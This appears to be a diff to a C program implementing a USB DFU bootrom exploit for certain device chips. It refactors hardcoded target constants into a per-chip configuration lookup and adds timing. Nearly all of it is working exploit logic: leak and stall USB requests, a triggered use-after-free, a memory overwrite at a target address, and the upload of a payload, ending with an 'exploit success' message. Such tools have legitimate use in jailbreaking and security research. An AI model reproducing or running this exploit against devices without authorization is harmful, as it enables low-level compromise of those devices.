@@ -3,21 +3,16 @@
 #include <stdbool.h>
 #include <string.h>
 #include <unistd.h>
+#include <sys/time.h>
 
 #include "lilirecovery.h"
-#include "payload.h"
-
-#define TARGET_CHIP_ID          0x8747
-#define TARGET_LARGE_LEAK       41
-#define TARGET_OVERWRITE_SIZE   0x774
-#define TARGET_OVERWRITE_ADDR   0x22000300
+#include "config.h"
 
 #define PWND_STR    "PWND:["
-
 #define NONCE_MAX_SIZE  20
 
-uint8_t current_nonce[NONCE_MAX_SIZE];
-uint8_t empty[0x800];
+uint8_t current_nonce[NONCE_MAX_SIZE] = { 0 };
+uint8_t empty[0x800] = { 0 };
 
 static void usb_req_no_leak(irecv_client_t client) {
     irecv_usb_control_transfer(client, 0x80, 6, 0x304, 0x40A, empty, 0x41, 1);
@@ -44,7 +39,7 @@ static void close_device(irecv_client_t client) {
     irecv_close(client);
 }
 
-irecv_client_t acquire_device(int attempts, bool need_found_report, bool need_nonce_verify) {
+irecv_client_t acquire_device(int attempts, bool need_found_report, bool need_nonce_verify, const exploit_config_t **config) {
     irecv_client_t client = NULL;
     bool connected = false;
 
@@ -93,14 +88,22 @@ irecv_client_t acquire_device(int attempts, bool need_found_report, bool need_no
         printf("found: %s\n", info->serial_string);
     }
 
-    if (info->cpid != TARGET_CHIP_ID) {
-        printf("not Haywire (CPID:%04x)\n", info->cpid);
-        goto fail;
-    }
-
     if (!info->srtg) {
         printf("not DFU mode\n");
         goto fail;
+    }
+
+    const exploit_config_t *curr = NULL;
+
+    if (config) {
+        curr = get_config(info->cpid);
+
+        if (!curr) {
+            printf("this platform is not supported\n");
+            goto fail;
+        }
+
+        *config = curr;
     }
 
     return client;
@@ -120,7 +123,9 @@ static void print_banner() {
 int main(void) {
     print_banner();
 
-    irecv_client_t device = acquire_device(1, true, false);
+    const exploit_config_t *config = NULL;
+
+    irecv_client_t device = acquire_device(1, true, false, &config);
     if (!device) {
         return -1;
     }
@@ -130,10 +135,13 @@ int main(void) {
         return -1;
     }
 
+    struct timeval st, et;
+    gettimeofday(&st, NULL);
+
     printf("leaking...\n");
 
     usb_req_stall(device);
-    for (int i = 0; i < TARGET_LARGE_LEAK; i++) {
+    for (int i = 0; i < config->large_leak; i++) {
         usb_req_leak(device);
     }
     usb_req_no_leak(device);
@@ -141,18 +149,18 @@ int main(void) {
     usb_reset(device);
     close_device(device);
 
-    device = acquire_device(10, false, true);
+    device = acquire_device(10, false, true, NULL);
     if (!device) {
         return -1;
     }
 
     printf("triggering UaF...\n");
 
-    irecv_usb_dummy_async_control_transfer(device, 0x21, 1, 0, 0, empty, sizeof(empty), 1);
+    int sent = irecv_usb_dummy_async_control_transfer(device, 0x21, 1, 0, 0, empty, sizeof(empty), 1);
     irecv_usb_control_transfer(device, 0x21, 4, 0, 0, NULL, 0, 100);
     close_device(device);
 
-    device = acquire_device(10, false, true);
+    device = acquire_device(10, false, true, NULL);
     if (!device) {
         return -1;
     }
@@ -162,17 +170,25 @@ int main(void) {
     usb_req_stall(device);
     usb_req_leak(device);
 
-    uint8_t overwrite[TARGET_OVERWRITE_SIZE + 4];
-    memset(overwrite, 0, TARGET_OVERWRITE_SIZE);
-    *(uint32_t *)((uint8_t *)&overwrite + TARGET_OVERWRITE_SIZE) = TARGET_OVERWRITE_ADDR;
+    size_t overwrite_size = config->overwrite_size - sent;
+    off_t overwrite_addr_ptr = overwrite_size;
+    overwrite_size += 4;
 
-    irecv_usb_control_transfer(device, 0, 0, 0, 0, overwrite, sizeof(overwrite), 100);
-    irecv_usb_control_transfer(device, 0x21, 1, 0, 0, (unsigned char *)payload, sizeof(payload), 100);
+    if (config->needs_overwrite_suffix) {
+        overwrite_size += 4;
+    }
+
+    uint8_t overwrite[overwrite_size];
+    memset(overwrite, 0x0, sizeof(overwrite));
+    *(uint32_t *)((uint8_t *)&overwrite + overwrite_addr_ptr) = config->overwrite_addr;
+
+    irecv_usb_control_transfer(device, 0, 0, 0, 0, overwrite, overwrite_size, 100);
+    irecv_usb_control_transfer(device, 0x21, 1, 0, 0, (unsigned char *)config->payload, config->payload_len, 100);
 
     usb_reset(device);
     close_device(device);
 
-    device = acquire_device(10, true, true);
+    device = acquire_device(10, true, true, NULL);
     if (!device) {
         return -1;
     }
@@ -183,7 +199,12 @@ int main(void) {
         return -1;
     }
 
+    gettimeofday(&et, NULL);
+    long elapsed = ((et.tv_sec - st.tv_sec) * 1000000) + (et.tv_usec - st.tv_usec);
+    float elapsed_sec = (float)elapsed / (1000 * 1000);
+
     printf("exploit success!\n");
+    printf("took - %.2fs\n", elapsed_sec);
 
     close_device(device);
 
